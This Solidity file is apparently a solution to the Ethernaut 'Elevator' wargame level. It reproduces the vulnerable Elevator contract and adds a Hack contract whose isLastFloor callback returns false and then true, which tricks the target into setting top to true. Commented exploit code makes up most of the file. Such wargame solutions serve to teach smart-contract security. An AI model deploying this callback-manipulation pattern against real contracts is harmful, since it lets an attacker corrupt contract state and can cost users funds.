// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) { // must be FALSE
      floor = _floor;
      top = building.isLastFloor(floor); // must be TRUE
    }
  }
}

contract Hack {
  // our instance     优秀的写法 
  address instance = 0x35D1366166142287bBc00285CE70ee62eB775c41;
  Elevator public target;
  bool result = true;
  
  function isLastFloor(uint) public returns (bool){
    // or shorter: result = !result
    if(result == true) {  // first call = false
      result = false;
    }else {      // second call = true 
      result = true;
    }
    return result;
  }

  function attack() public {
    target.goTo(13); // make up any number
    // the Ethernaut contract will now do Building(msg.sender)
    // that means we get an instance of the Building, refering to our own msg.sender contract address
    // the isLastFloor() method that will be executed will now be the one we provided
  }

  constructor() {
    target = Elevator(instance);
  }
}